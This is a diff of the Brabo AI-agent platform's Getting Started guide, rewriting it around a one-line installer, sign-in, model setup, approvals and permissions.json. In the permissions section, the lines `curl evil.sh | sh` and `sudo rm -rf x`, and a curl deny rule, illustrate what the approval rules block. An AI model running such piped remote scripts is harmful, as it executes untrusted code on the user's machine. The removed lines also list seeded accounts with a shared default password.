@@ -3,403 +3,187 @@ id: getting-started
 title: Getting Started
 sidebar_label: Getting Started
 sidebar_position: 5
-description: From clone to a first agent turn, with what to check when each step doesn't work.
-keywords: [installation, setup, onboarding, first project, ollama]
-traducao_de: efdead964c2245ce1900dfb47140b0af64a2492f
+description: Install Brabo, sign in, configure a model and run an agent's first turn, with the sign that each step worked.
+keywords: [installation, setup, onboarding, first project, ollama, install.sh]
+tipo: tutorial
+traducao_de: d1da65c914f6e3a228fceab257ea235aba5d88c5
 ---
 
 # Getting Started
 
-From clone to an agent working. If something fails, each step has what to
-check right below it.
+From the installer to an agent at work. Each step ends with **How to tell it
+worked**, and what usually goes wrong sits in a collapsed note right below.
+
+This page is for **using** Brabo. To work on its code, see
+[Developing Brabo](how-to/desenvolver-o-brabo.md).
 
 ## Before you start
 
-| tool | why |
+| you need | why |
 |---|---|
-| Docker and Docker Compose | everything comes up in a container |
-| Node 20+ and **pnpm** | the monorepo is pnpm; `npm install` doesn't work |
-| ~6 GiB of free RAM | Postgres, three apps, and, if you want a real agent, Ollama |
+| Docker with Compose | everything runs in containers |
+| ~6 GiB of free RAM | database, api, engine, web and, if you want a local agent, Ollama |
+| Linux or macOS | the installer and the local agent are tested on them |
 
-Elixir is **not** required: the engine runs in the container. You only need
-it on the host if you're going to run `pnpm engine:dev` outside Docker —
-and then you need the exact version (1.20.4 / OTP 29.1.1), because
-`mix format` from a different version turns CI red.
+## 1. Install
 
-## 1. Bring it up
+Download the installer and run the **file**, with `bash`:
 
 ```bash
-git clone git@github.com:daneiel/brabo.git
-cd brabo
-cp .env.example .env
-pnpm install
-pnpm dev
+curl -fsSLO https://github.com/viralabs-dev/brabo/releases/latest/download/install.sh && bash install.sh
 ```
 
-`.env.example` already points everything at the containers — on the first
-run you don't need to edit anything.
+To see what it would do before letting it, run `bash install.sh --print-plan`.
 
-`pnpm dev` brings up Postgres 16 + pgvector, api, engine, and web, and
-applies migrations on both sides. The first time pulls images and takes a
-few minutes.
+It has to be a file, not `curl … | sh`, for two reasons: it asks questions in
+the terminal (which the pipe would swallow) and it checks its own hash against
+the Release's signed manifest. Along the way it asks whether to turn on the
+container broker (you may say no) and whether to turn on Ollama, and asks for
+the email and password of the first account. The password is not stored
+anywhere.
 
-### The two local modes don't coexist {#the-two-local-modes-dont-coexist}
+**How to tell it worked:** the installer checks the `/health` of the api and
+of the engine before saying it installed, and ends with a `Web: http://localhost:8088` line.
 
-There are two ways to run Brabo on your machine, and they **fight over the
-same ports**:
+<details>
+<summary>If it goes wrong</summary>
 
-| mode | comes up with | web at | what it is |
-|---|---|---|---|
-| **development** | `pnpm dev` | <http://localhost:5173> | compose + Vite, with hot reload |
-| **validation** | `make deploy-local` | <http://localhost:8088> | k3d with the production images |
+- **Port in use:** the installer says which one. Free it and run again.
+- **There was already an installation:** it takes a backup, proves the backup restores, and only then migrates.
 
-Both publish api on `:3000` and engine on `:4000`. That's **deliberate**
-(ADR 0025, decision 10): by keeping the ports, `docker/smoke.sh` holds for
-both without translation. The price is that only one runs at a time.
-
-With the cluster up, `pnpm dev` can't publish the `api` port; since the
-`web` service depends on it, **5173 never opens**. A `preflight` step runs
-before compose and says exactly that, instead of Docker's
-`port is already allocated`:
-
-```bash
-make k8s-down && pnpm dev     # from validation mode to development mode
-```
-
-To know which one you're in without guessing: `pnpm dev:preflight`.
-
-### An installation and a checkout on the same machine
-
-The dev compose is the Docker project **`brabo-dev`** (containers
-`brabo-dev-api-1`…, volumes `brabo-dev_pgdata`…); an installation made with
-`install.sh` is **`brabo`**. Until ADR 0170
-both were `brabo`, so the two shared containers, network and volumes, and
-`reset-total.sh` would have wiped the installation's database.
-
-Even with the names apart, `pnpm dev` (through the preflight) and
-`reset-total.sh` **refuse** while this machine has any container of the
-installation compose, and list them. To develop, bring the installation down
-**without** `-v` — its volumes and data stay, and `up -d` brings it back:
-
-```bash
-docker compose -f <installation folder>/docker/docker-compose.install.yml \
-  --env-file <installation folder>/.env down   # the preflight prints the exact paths
-```
-
-**Developed here before ADR 0170?** Your data is still in the old `brabo_*`
-volumes and the next `pnpm dev` starts with empty `brabo-dev_*` ones; the
-preflight warns about it. Copying the data over, starting from scratch, and
-telling your old dev volumes from an installation's are in the runbook,
-"Moving a dev environment to brabo-dev".
-
-### Local folder for workspaces {#local-folder-for-workspaces}
-
-By default, the files agents write live in a managed Docker volume — not a
-folder you can open in Finder/Explorer. To swap it for a real folder on
-your disk, set in `.env`:
-
-```bash
-PROJECT_WORKSPACES_HOST_DIR=~/brabo-projetos
-GIT_LOCAL_REPOS_HOST_DIR=~/brabo-projetos-bare
-```
-
-Both together, always — `api` and `engine` read the same path, and
-different values would make the two see different trees of the same
-repository. The chosen folder becomes the root for **all** projects on
-this instance — don't point it at your entire `$HOME` or at a folder with
-other secrets of yours.
-
-Inside it, each project has its own subfolder, named by
-`workspace_dir_name` (RN-109): a project created from this change onward
-gets a READABLE name, `<folder>/<slug>-<8 chars of id>` (e.g. `<folder>/
-checkout-3f2b1c8e`), instead of a raw UUID — easier to recognize when
-opening the folder in Finder/Explorer. A project created BEFORE this
-change keeps its folder named by the raw UUID (`<folder>/<project_id>`):
-the name is decided once, at creation, and is never recomputed — not even
-when the project's slug changes later in Settings.
-
-Nothing in the approval policy changes: inside the project's scope the
-agent already had freer access, and outside it it already required
-approval (RN-075) — the only thing that changes is that what used to be
-invisible inside the volume is now in a folder you can open with your own
-editor and `git`.
-
-The `api` and `engine` containers run as **root** in development
-(the same situation already known for `node_modules`/`apps/api/dist` — see the
-warning at the top of this repository). Every file the agent writes to the
-local folder ends up owned by `root` on your disk — to edit/delete it without
-`sudo` afterwards, run `sudo chown -R $USER ~/brabo-projetos` once
-(adjust the path to the one you chose). Confirmed by execution: a
-`docker run` writing to a test bind mount left the file inaccessible to the
-regular user until a second container (running as root) removed it.
-
-Only tested on Linux/macOS. Host bind mounts on Docker Desktop for Windows
-have known pitfalls (permission/ownership between NTFS and the container
-user, and NTFS doesn't distinguish upper from lower case where `git
-worktree` expects it to) — don't enable it there yet.
-
-**If it doesn't come up:**
-
-| symptom | cause |
-|---|---|
-| port taken | it's almost always the local cluster still up — see above. If not, change `API_PORT`, `ENGINE_PORT`, `WEB_PORT`, or `OLLAMA_PORT` in `.env`. Changing `WEB_PORT` is safe: CORS's `WEB_ORIGIN` derives from it, so the accepted origin follows the port ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
-| api comes up and dies | check `docker compose logs api` — it's almost always the migration |
+</details>
 
 ## 2. Sign in
 
-Login belongs to the api itself — there's no more external IdP
-([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Seed a
-ready-made user:
+Open <http://localhost:8088> and sign in with the email and password you typed
+in the installer. The login belongs to the api itself.
 
-```bash
-pnpm --filter api seed
-```
+**How to tell it worked:** you land on your workspace's dashboard.
 
-It creates one account per role: `owner@brabo.dev` (owner), `maintainer@brabo.dev` (maintainer),
-`developer@brabo.dev` (developer) and `viewer@brabo.dev` (viewer), all already with a verified email and the password `brabo12345678` —
-overridable via `BRABO_SEED_PASSWORD`. Along with it comes the **Acme
-Corp** workspace, ready to create a project.
+<details>
+<summary>If it goes wrong</summary>
 
-Open <http://localhost:5173> and sign in with those credentials.
+Does the login return **401** with the right password? The answer is the same
+for a wrong password, a nonexistent email and a locked account, on purpose.
+Check the email and try again; if
+the account was never created, run the installer again.
 
-> **Why seed instead of signing up through the screen?** Sign-up works, but
-> login requires a verified email and `MailSender` is log-only at this
-> stage — the verification link goes out in the api's log and, by default,
-> **without the token**. To walk through the real sign-up flow, turn on
-> `AUTH_MAIL_LOG_TOKENS=true` in `.env` and grab the link from `docker
-> compose logs api`. It's inconvenient on purpose: a verification token in
-> an application log is a credential in plain text.
-
-**If login returns 401 with the right password:** check that the seed ran
-against the **same** database the api is using — `DATABASE_URL` from
-`.env`. The response is the same for a wrong password, a nonexistent
-email, and a locked account, on purpose
-([RN-032](business-rules/api.md#rn-032)), so it doesn't distinguish the cases
-for you.
+</details>
 
 ## 3. Configure a model
 
-One already comes set up: the Ollama container pulls **`llama3.2:1b`** on
-its own on the first boot. Enough to see the system working end to end
-without configuring anything.
+Pick one of the two:
 
-It's too small for real work, so when you want more:
+- **Ollama (local, free, offline):** answer **y** to the installer's question,
+  or turn it on later (the [runbook](runbook.md) explains how). The default model is small and
+  is enough to see the system work end to end.
+- **A provider's key:** in the interface, under **Providers** (bottom of the menu). The
+  key is encrypted with envelope encryption before it touches the database.
 
-**A bigger local model** — free, and runs offline:
+The model is resolved in a cascade, **session > agent > project > workspace**, and the
+first one that exists wins. You can
+leave the local one as the general default and put an API model only on QA, the role that fits
+a small model the least.
 
-```bash
-docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
-```
+**How to tell it worked:** the provider shows up under **Providers** with no credential
+error, or Ollama answers and the model shows up in the list.
 
-**A provider API** — in the UI, under **Providers** (footer of the
-menu). The key is encrypted with envelope encryption before it
-touches the database.
+<details>
+<summary>If it goes wrong</summary>
 
-The model is resolved in a cascade — **session > agent > project >
-workspace**, the first one that exists
-([RN-020](business-rules/api.md#rn-020)). You can leave the local one as the
-default and put an API model just on QA, the role that fits worst in a
-small model.
+An agent that does not answer, or answers empty, is almost always the inference
+environment: truncated context or too little memory. The
+[runbook](runbook.md#ambiente-de-inferencia) explains how to measure it.
 
-> With an NVIDIA GPU, use `pnpm dev:gpu`. Without the device reservation,
-> Ollama runs 100% on CPU and a 7,000-token prompt takes ~50s **just for
-> ingestion** — the agent looks stuck when it's actually reading. The
-> override is opt-in because without `nvidia-container-toolkit` on the
-> host the reservation makes the service **fail to start**.
+</details>
 
 ## 4. Create a project
 
-Dashboard → **New project**. The wizard asks for a name and how to connect
-git:
+Dashboard → **New project**. The wizard asks for a name and how to connect git:
 
 | option | when to use |
 |---|---|
-| **Local** | to experiment. Bare repos on disk, no account anywhere |
-| **GitHub** / **GitLab** | real work. PAT or OAuth |
+| **Local** | to experiment: repositories on disk, no account anywhere |
+| **GitHub** / **GitLab** | real work, with a PAT or OAuth |
 
-On confirming, it runs the **Gitflow bootstrap**: five steps that create
-`dev`, `qa`, `main`, apply protections, and commit the base files.
-Progress shows live.
+On confirmation, the **Gitflow bootstrap** runs: five steps that create `dev`,
+`qa` and `main`, apply protections and commit the base files.
 
-Some steps can come back as **`skipped`** (already done) or **`degraded`**
-(finished without a capability). Both are success. With the Local
-provider, branch protection always comes back `degraded` — there's no
-platform to apply it to, and that doesn't weaken anything: what prevents
-an improper merge is the [ceiling in the domain](reference/permissions.md#caps),
-not the platform.
+**How to tell it worked:** the five steps show up as completed, live.
 
-If a step fails, fix the cause and tell it to resume: the bootstrap picks
-up where it left off, it doesn't start over
-([RN-029](business-rules/api.md#rn-029)).
+<details>
+<summary>If it goes wrong</summary>
+
+- **`skipped`** (already done) and **`degraded`** (finished without a capability) are success. With the Local provider, branch protection always comes out `degraded`: there is no platform to apply it, and what stops an improper merge is the [ceiling in the domain](reference/permissions.md#caps).
+- If a step **fails**, fix the cause and ask to resume: the bootstrap continues from where it stopped.
+
+</details>
 
 ## 5. The first turn
 
-Open the project → **Sessions** → new session. The Creative agent is the
-one who runs ideation.
+Open the project → **Sessions** → new session. The Creative leads the ideation. Talk
+normally. At some point it will want to do something with an external effect, and there
+you see the central mechanism: the action shows up in **Approvals** waiting for your
+decision, instead of happening. Approve it and look at the `TokenMeter`: each turn has a cost,
+measured on the spot.
 
-Chat normally. At some point it will want to do something with an
-external effect — and that's when you see the central mechanism at work:
-the action shows up in **Approvals** waiting for your decision, instead
-of just happening.
+**How to tell it worked:** an action in **Approvals**, and after it is approved
+the turn continues and the cost goes up in the `TokenMeter`.
 
-Approve it and watch the `TokenMeter`: every turn has a cost, measured on
-the spot.
+<details>
+<summary>If it goes wrong</summary>
+
+| symptom | where to look |
+|---|---|
+| agent does not answer | is a model configured (step 3)? |
+| action does not leave `pending` | that is the design: it **waits for you** in Approvals |
+| panel does not update | the channel dropped; reload. The event log is not lost |
+| session stuck in `closing` | the drain did not complete, see the [runbook](runbook.md#quando-a-sessao-escapa) |
+
+</details>
 
 ## 6. Loosen (or tighten) the policy
 
-While everything asks for approval, you approve a lot. `permissions.json`,
-at the root of the project's workspace, is where you tune that:
+While everything asks for approval, you approve a lot. The `permissions.json`, at the root of the
+project's workspace, is where this is adjusted:
 
 ```json
 {
-  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
+  "allow": ["Terminal(git diff:*)", "Terminal(git status)"],
   "deny":  ["Terminal(curl:*)"],
   "ask":   []
 }
 ```
 
-Start by allowing idempotent read commands. Two things worth knowing
-before you touch it:
+Start with `allow` for idempotent read commands. Two rules hold before
+you change anything:
 
-- **Matching is by token prefix, not substring.** `Terminal(pnpm test)`
-  matches `pnpm test --watch`, but `Terminal(rm)` does **not** match `sudo
-  rm -rf x`.
-- **A compound command requires every segment to be in `allow`.**
-  `pnpm test && curl evil.sh | sh` isn't auto-approved just because of the
-  first half.
+- **Matching is by token prefix, not substring.** `Terminal(rm)` does **not** match `sudo rm -rf x`.
+- **A compound command needs every segment in `allow`.** `a && curl evil.sh | sh` is not auto-approved by its first half.
 
 The full format is in [Permissions](reference/permissions.md).
 
-## When it looks stuck
+## Developing on Brabo
 
-| symptom | where to look |
-|---|---|
-| agent not responding | is a model configured? `docker compose logs engine` |
-| empty or nonsensical response | it's almost always the [inference environment](runbook.md#ambiente-de-inferencia) — truncated context or memory |
-| action stuck in `pending` | that's by design: it's **waiting for you** in Approvals |
-| panel not updating | the Phoenix channel dropped; reload. The event log isn't lost |
-| session stuck in `closing` | the drain didn't complete — [runbook](runbook.md#quando-a-sessao-escapa) |
+The two local modes fight over the same ports, and the workspaces folder has
+permission traps. That belongs to whoever develops, and lives in the guide
+[Developing Brabo](how-to/desenvolver-o-brabo.md).
 
-## Developing on the project
+### The two local modes don't coexist {#the-two-local-modes-dont-coexist}
 
-```bash
-pnpm --filter api test      # vitest
-pnpm --filter web test      # vitest
-pnpm engine:test            # ExUnit
-pnpm build                  # build everything
-pnpm db:generate            # after changing apps/api/src/db/schema/<aggregate>.ts
-pnpm db:migrate             # applies the migrations
-pnpm dev:down               # tear everything down
-```
+See [the ports of the two modes](how-to/desenvolver-o-brabo.md).
 
-### Where everything lives
+### Local folder for workspaces {#local-folder-for-workspaces}
 
-```
-apps/
-  api/      NestJS + Drizzle          → schema "public"
-  engine/   Elixir/OTP + Phoenix      → schema "engine"
-  web/      React + Vite
-packages/
-  shared/   tipos TS compartilhados (import type only)
-design/     design system — fonte de verdade de UI
-docker/     compose de dev e prod, Dockerfiles, smoke.sh
-deploy/k8s/ base + overlays local/staging/prod (Kustomize)
-docs/       esta documentação, incluindo os ADRs
-scripts/
-  ci/       automação de release e política de branch (testada com vitest)
-  dev/      ferramentas locais — o menu do `pnpm bootstrap` e o preflight
-  docs/     geração e verificação da documentação
-website/    só a árvore do Redoc; o site é gerado por scripts/docs/site/ a partir de docs/
-```
-
-`apps/engine` sits outside the pnpm workspace (it is a Mix project), with root
-scripts that delegate to `mix` (`pnpm engine:setup`, `pnpm engine:dev`,
-`pnpm engine:test`). If the host's Elixir is not the project's, format through
-the container:
-
-```bash
-docker run --rm -v "$PWD/apps/engine:/app" -w /app \
-  hexpm/elixir:1.20.4-erlang-29.1.1-alpine-3.24.2 mix format
-```
-
-**Database.** One Postgres, one database (`brabo`), two schemas so they never
-collide: the api (Drizzle) uses `public`, with migrations in
-`apps/api/src/db/migrations/` and one schema file per aggregate
-(`db/schema.ts` is only the barrel); the engine (Ecto/Oban) uses `engine`, via
-`migration_default_prefix`, with migrations in
-`apps/engine/priv/repo/migrations/`. pgvector is enabled by
-`docker/postgres/init.sql`, which runs once when the volume is created.
-
-**Tests that protect properties.** No feature goes in without a happy-path
-test and a failure-case test. The git providers go through a single contract
-suite, run against all three (Local, GitHub, GitLab).
-`apps/api/test/interfaces/route-surface.spec.ts` checks the routes against
-[`security-surface.md`](security-surface.md) — a new route without a
-classification breaks the test —, and `apps/engine/test/engine_web/route_surface_test.exs`
-requires 401 without a token on every engine route, save for named exceptions.
-
-**A turn, end to end:**
-
-```mermaid
-sequenceDiagram
-  participant U as Você
-  participant W as web
-  participant A as api
-  participant E as engine
-  participant L as LLM
-
-  U->>W: abre uma sessão
-  W->>A: POST /sessions
-  A->>A: grava session.created (event log + outbox)
-  A-->>E: Oban consome a outbox
-  E->>E: SessionServer + Harness montam o contexto
-  E->>L: turno
-  L-->>E: "quero rodar esta ferramenta"
-  E->>A: vira proposed_action
-  A->>A: IAM → agent_autonomy → permissions.json → tetos
-  A-->>U: pede aprovação
-  U->>A: aprova
-  A-->>E: executa
-  E->>A: evento imutável
-  A-->>W: broadcast — o painel atualiza
-```
-
-### The menu, so you don't have to memorize all this
-
-```bash
-pnpm bootstrap
-```
-
-These commands live in three places that don't talk to each other —
-`package.json`, the `Makefile` (Kubernetes), and scripts under
-`deploy/k8s/` and `docker/`. The menu brings the four groups (Docker, K8s,
-Database, Test) together in one door, navigated by digit with no Enter,
-with `v` to go back and `q` to quit; valid shortcuts show in the footer.
-While a command is running, the screen shows only that it's running — `↓`
-reveals the live output and `↑` hides it.
-
-It **doesn't reimplement anything**: each item calls exactly the command
-that already exists, and `pnpm bootstrap --print-commands` prints the
-whole tree with each leaf's command, without executing — that's how you
-check what it does before letting it do it. The full list is in
-[Scripts](reference/scripts.md).
-
-One item deserves care: **`Database › Delete`** drops every table (the
-api's and the engine's, which share the same database). It's the only
-screen that requires pressing Enter, requires typing the database name,
-and says at the end that recovering means `pnpm db:migrate` **and**
-`pnpm engine:migrate`.
-
-Always work in `feature/*` off `dev`, with conventional commits in
-pt-BR. `CLAUDE.md` has the full conventions.
-
-> The `api` and `web` containers run as root in development and write to
-> the bind mount. If you later want to build on the host, run once
-> `sudo chown -R $USER apps/api/dist apps/*/node_modules`.
+See [the workspaces folder](how-to/desenvolver-o-brabo.md#pasta-dos-workspaces).
 
 ## Next
 
-- [Architecture](architecture.md) — how the pieces fit together
-- [Business rules](business-rules.md) — what the system guarantees, and
-  where that lives in code
-- [Runbook](runbook.md) — when you leave development behind
+- [Architecture](architecture.md): how the pieces fit together
+- [Business rules](business-rules.md): what the system guarantees, and where that lives in the code
+- [Runbook](runbook.md): operate, restore, rotate a key
+
+## For more
+
+- The installer's shape: [ADR 0150](adr/0150-instalador-de-uma-linha.md); the api login: [ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md).
+- Rules: [RN-511](business-rules/infra.md#rn-511) and [RN-526](business-rules/produto.md#rn-526) (installer), [RN-032](business-rules/api.md#rn-032) (login), [RN-020](business-rules/api.md#rn-020) (cascading model), [RN-029](business-rules/api.md#rn-029) (resuming the bootstrap).
